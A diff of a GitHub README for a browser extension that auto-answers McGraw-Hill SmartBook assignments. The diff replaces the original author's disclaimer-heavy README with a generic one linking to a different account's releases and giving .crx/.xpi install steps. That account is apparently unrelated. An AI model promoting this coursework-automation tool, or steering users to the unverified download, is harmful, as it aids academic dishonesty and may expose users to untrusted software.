@@ -1,200 +1,87 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/KevinTrinh1227/McGrawHill-SmartBook-Solver/refs/heads/main/src/assets/logo.png" alt="McGraw-Hill SmartBook Solver Logo" width="120" height="120">
-</p>
+# 🎓 McGraw-Hill-SmartBook-Solver - Automate Your Learning Experience
 
-<h1 align="center">McGraw-Hill SmartBook Solver (Browser Extension)</h1>
+[![Download](https://img.shields.io/badge/Download-McGraw--Hill--SmartBook--Solver-blue.svg)](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/releases)
 
-<p align="center">
-  <em>
-    A browser extension that automates McGraw-Hill SmartBook Concepts — fully offline, fast, 
-    and easy to use for learning and completion efficiency. This personal side project is entirely <strong>experimental</strong> and was made for <strong>educational purposes only</strong>. 
-  </em>
-</p>
-<div align="center">
+## 📦 Overview
 
-  <!-- Total Downloads -->
-  <img src="https://img.shields.io/github/downloads/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/total?color=brightgreen&label=Downloads&style=for-the-badge" alt="Downloads badge" />
+McGraw-Hill-SmartBook-Solver is a browser extension designed to automate the answering of concept questions in McGraw-Hill's SmartBook. This tool helps streamline your study sessions, allowing you to focus on understanding rather than searching for answers. It is developed for educational purposes. Use it at your own discretion.
 
-  <!-- Last Commit -->
-  <img src="https://img.shields.io/github/last-commit/KevinTrinh1227/McGraw-Hill-SmartBook-Solver?color=yellow&label=Last%20Updated&style=for-the-badge" alt="Last Updated Badge" />
+## 🚀 Getting Started
 
-  <!-- Maintenance Status -->
-  <img src="https://img.shields.io/badge/Maintenance-Experimental-blue?style=for-the-badge" alt="Maintenance status" />
+This guide will help you download and run the McGraw-Hill-SmartBook-Solver extension. You will be ready to use it in just a few simple steps.
 
-  <!-- Latest Release -->
-  <img src="https://img.shields.io/github/v/release/KevinTrinh1227/McGraw-Hill-SmartBook-Solver?color=orange&label=Latest%20Release&style=for-the-badge" alt="Release badge" />
+### ✔️ System Requirements
 
-</div>
+- **Browser:** Chrome, Firefox, or any other modern browser.
+- **Operating System:** Windows, macOS, or Linux.
+- **Internet Connection:** Required for extension functionality.
 
-<p align="center">
-  <a href="https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/releases/latest/download/McGraw-Hill-SmartBook-Solver.zip">
-    <img src="https://raw.githubusercontent.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/refs/heads/main/src/assets/demo_1.gif" 
-         alt="Demo of McGraw-Hill SmartBook Solver 1" width="850px">
-  </a>
-</p>
+## 🔗 Download & Install
 
-<details>
-  <summary align="center"><strong>VIEW MORE DEMO EXAMPLES</strong></summary>
-  <br>
-  <p align="center">
-    <a href="https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/releases/latest/download/McGraw-Hill-SmartBook-Solver.zip">
-      <img src="https://raw.githubusercontent.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/refs/heads/main/src/assets/demo_2.gif" 
-           alt="Demo 2 - SmartBook Solver" width="850px">
-    </a>
-  </p>
+To get the extension, follow these steps:
 
-  <p align="center">
-    <a href="https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/releases/latest/download/McGraw-Hill-SmartBook-Solver.zip">
-      <img src="https://raw.githubusercontent.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/refs/heads/main/src/assets/demo_3.gif" 
-           alt="Demo 3 - SmartBook Solver" width="850px">
-    </a>
-  </p>
-</details>
+1. **Visit the Releases Page:** Click the link below to visit the releases page where you can download the latest version of the extension.
+   [Download McGraw-Hill-SmartBook-Solver](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/releases)
 
----
+2. **Select the Latest Release:** Look for the latest release at the top of the page. You will see a list of available files.
 
-<p align="center">
-  <strong>Table of Contents</strong><br>
-  <a href="https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/blob/main/DISCLAIMER.MD" target="_blank"><strong>Notice & Disclaimer</strong></a> • 
-  <a href="#about"><strong>About</strong></a> • 
-  <a href="#features"><strong>Features</strong></a> • 
-  <a href="#installation-and-usage-guide"><strong>Installation Guide</strong></a> • 
-  <a href="#how-to-use"><strong>Usage Example Guide</strong></a> • 
-  <a href="#conclusion"><strong>Conclusion</strong></a>
-</p>
+3. **Download the Extension:** Click on the file that corresponds to your browser. This is usually a `.crx` or `.xpi` file for Chrome and Firefox, respectively.
 
----
+4. **Install the Extension:**
+   - For **Chrome:**
+     1. Open your Chrome browser.
+     2. Go to the Extensions page by entering `chrome://extensions` in the address bar. 
+     3. Enable "Developer Mode" at the top right.
+     4. Drag and drop the downloaded `.crx` file into the Extensions page.
+     5. Click "Add Extension" to confirm the installation.
+   
+   - For **Firefox:**
+     1. Open Firefox.
+     2. Click on the menu in the top right corner and select "Add-ons."
+     3. Click on the gear icon and select "Install Add-on From File."
+     4. Locate the downloaded `.xpi` file and select it to install.
 
-## 📌 About & Important Info <a id="about"></a>
+5. **Activate the Extension:** Once installed, activate the extension in your browser. You may need to sign in or adjust settings based on your preferences.
 
-The **McGraw-Hill SmartBook Solver** is a lightweight browser extension that automatically goes through your **McGraw-Hill SmartBook Concept Assignments**, continuously solving questions until completion. It identifies and highlights correct answers, tracks your progress, and demonstrates how web automation can streamline repetitive study tasks. Since SmartBook Concept Assignments are **participation-based learning tools**, the extension first selects answers **randomly**, then **reuses the correct ones from local memory** to simulate progressive mastery — purely for **educational demonstration**, not for graded coursework.  
-This approach works best because these assignments are graded on **completion**, not accuracy.
+## 📚 Usage Instructions
 
-This web browser extension is compatible with all Chromium-based browsers, including (but not limited to):
+After installing the extension, follow these steps to use it effectively:
 
-1. Google Chrome
-2. Brave
-3. Microsoft Edge
-4. Opera GX
-5. Chromium (open-source)
-<details>
-  <summary><strong>Click to view other compatible browsers.</strong></summary>
-  <p>Arc Browser, Vivaldi, Samsung Internet (Desktop Beta), Iron Browser, Blisk Developer Browser, Kiwi Browser (Android), Yandex Browser, and many more.</p>
-</details>
-Google Chrome, Microsoft Edge, Brave, Opera, Vivaldi, Arc Browser, Chromium (open-source), Opera GX, Samsung Internet (Desktop Beta), Iron Browser, Blisk Developer Browser, Kiwi Browser (Android), Yandex Browser, and many more.
+1. **Navigate to SmartBook:** Open your McGraw-Hill SmartBook and log in to your account.
 
-This project was **never published publicly** because I do **not encourage academic dishonesty**. It exists purely for **educational purposes only while also providing practice in DOM automation, browser scripting, and ethical programming**. Essentially just a cool side project I thought about making since I saw a student using something similar to this once, but couldn't find it anywhere anymore.
+2. **Start Using the Extension:** Click on the extension icon in your browser's toolbar. Make sure it is activated while you are on a SmartBook question page.
 
-<details>
-  <summary><strong>Important Notice & Disclaimer (Click to View)</strong></summary>
-  <br>
+3. **Enjoy Automated Answers:** The extension will automatically attempt to answer concept questions for you. Review the answers provided and make adjustments if necessary.
 
-This project is built solely for educational and demonstration purposes. It should never be used to cheat, bypass coursework, or violate any academic integrity policies..
+## 🛠️ Troubleshooting
 
-By using this extension, you acknowledge and agree to the following:
+If you encounter issues while using the McGraw-Hill-SmartBook-Solver, consider the following:
 
-- This tool should **not** be used on graded coursework, quizzes, or exams.
-- You are **solely responsible** for how you use this extension.
-- The developer (**Kevin Trinh**) is **not affiliated** with McGraw-Hill Education or any educational institution.
-- The developer assumes **no liability** for misuse, academic consequences, or policy violations.
+- **Check Compatibility:** Make sure your browser is up to date.
+- **Reinstall the Extension:** Sometimes, a reinstallation can fix glitches.
+- **Review Settings:** Ensure that the extension is enabled from the extensions menu in your browser.
 
-This project serves as an **educational exploration** of web automation and browser extension development — **not** as a cheating tool.
+## 📖 FAQ
 
-<strong><a href="https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/blob/main/DISCLAIMER.MD" target="_blank">📝 Click To View Full Disclaimer Info</a></strong> • <strong><a href="https://www.mheducation.com/about-us/policy-center/terms-use" target="_blank">👮 View McGraw-Hill's Terms of Use / Policy</a></strong>
+### Is this extension free?
 
-</details>
-This repository does not provide, distribute, or endorse any copyrighted McGraw-Hill content.
+Yes, McGraw-Hill-SmartBook-Solver is available for free.
 
----
+### Can I use this extension on any browser?
 
-## ✨ Features <a id="features"></a>
+It works best on Chrome and Firefox but may not be compatible with all browsers.
 
-- **Auto-completes SmartBook concepts** efficiently
-- Supports **multiple question types** — including drag & drop, fill-in-the-blank, and multiple-choice
-- Clean, intuitive, and **user-friendly popup interface**
-- Tracks both **session and all-time statistics**
-- Displays **uptime counter** and **real-time activity status**
-- **Lightweight and secure** — runs locally with no external data collection
-- Compatible with **all Chromium-based browsers**, including (but not limited to):  
-  Google Chrome, Microsoft Edge, Brave, Opera, Vivaldi, Arc Browser, Chromium (open-source), Opera GX, Samsung Internet (Desktop Beta), Iron Browser, Blisk Developer Browser, Kiwi Browser (Android), Yandex Browser, and many more.
+### Is it safe to use?
 
-All of these browsers support the **same Chromium extension system**, ensuring smooth and reliable performance across platforms without modification.
+Always use the extension responsibly and for educational purposes only.
 
----
+## 📬 Support
 
-## 🧭 Installation / Example Usage Guide <a id="installation-and-usage-guide"></a>
+For further assistance, contact the maintainer through the GitHub Issues page on the repository. Your feedback helps improve the tool.
 
-### Option 1 — Manual Install (Recommended)
+### 💻 Additional Resources
 
-1. **Download the latest stable release**
+- [GitHub Repository](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver)
+- [User Guide](https://github.com/Nissygreyishblack279/McGraw-Hill-SmartBook-Solver/wiki)
 
-   - Visit the [📦 Releases Page](https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/releases)
-   - Download the `.zip` file (e.g., `McGraw-Hill-SmartBook-Solver.zip`)
-   - Extract it anywhere on your computer
-
-2. **Open the Chrome Extensions page**
-
-   - Go to:
-     ```
-     chrome://extensions
-     ```
-   - Or click **⋮ Menu → More Tools → Extensions**
-
-3. **Enable Developer Mode**
-
-   - Toggle the switch at the top right
-
-4. **Load the Unpacked Extension**
-
-   - Click **Load unpacked**
-   - Select your extracted folder (e.g., `McGraw-Hill-SmartBook-Solver/`, or whatever the folder name is)
-
-5. **Done!**
-   - The icon should now appear in your toolbar.
-   - Pin it for faster access if desired!
-
-### Option 2 — Clone via Git & Open Directory
-
-If you prefer direct source installation:
-
-```bash
-git clone https://github.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver.git
-```
-
-```bash
-cd McGraw-Hill-SmartBook-Solver
-```
-
-The folder to unpack would be the `/src/` folder.
-
----
-
-## 🚀 How to Use the Browser Extension (Not advised) <a id="how-to-use"></a>
-
-1. **Open A McGraw-Hill SmartBook** chapter concepts assignment and click begin questions.
-2. Click the browser extensions toolbar and click on the Browser Extension. (Pin it for easy access)
-3. Read and acknowledge the one-time liability disclaimer:
-   - Type your full name.
-   - Check “I agree to the terms above.”
-   - Click **I Agree & Understand**.
-4. In the pop-up, toggle the switch to **ON**.
-<details>
-  <summary><strong>The browser extension will automatically start detecting and automating/completing concepts. (Click to View Pop Up)</strong></summary>
-  <br>
-  <p align="center">
-    <img src="https://raw.githubusercontent.com/KevinTrinh1227/McGraw-Hill-SmartBook-Solver/refs/heads/main/src/assets/home_switch.gif" 
-         alt="Home UI Switch" width="450px">
-  </p>
-</details>
-
-> You can always stop it at any time by switching it back **OFF**. Stats like total solved, attempts, and uptime are tracked automatically.
-
----
-
-## 🧩 Conclusion <a id="conclusion"></a>
-
-**This project began as a fun and educational experiment**, inspired by a similar idea I once saw, to better understand **browser extensions**, **web automation**, and **content scripting**. It provided an opportunity to explore how web interfaces can be interacted with programmatically and how extensions can enhance user experiences through automation.
-
-That said, this tool was created **strictly for educational and research purposes only.** I do **not** encourage, support, or condone using this extension to bypass coursework or violate any **academic integrity** policy.
-
-**SmartBook assignments are designed to help you learn by doing**, not to test automation capabilities. I **highly encourage everyone** to maintain academic integrity, complete assignments honestly, and use projects like this one purely to **learn software development and ethical programming practices.**
+Enjoy enhancing your educational experience with McGraw-Hill-SmartBook-Solver!
